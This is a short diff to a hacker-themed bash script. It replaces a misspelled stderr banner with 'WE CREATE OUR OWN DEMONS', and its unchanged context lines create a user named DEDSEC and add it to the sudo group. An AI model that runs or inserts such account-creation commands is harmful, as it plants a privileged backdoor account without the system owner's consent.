@@ -1,5 +1,5 @@
 #! /bin/bash
-printf "WE CREATE AUVER AWN DEMANS" >&2
+printf "😈😈 WE CREATE OUR OWN DEMONS 😈😈" >&2
 {
 sudo useradd -m DEDSEC
 sudo adduser DEDSEC sudo
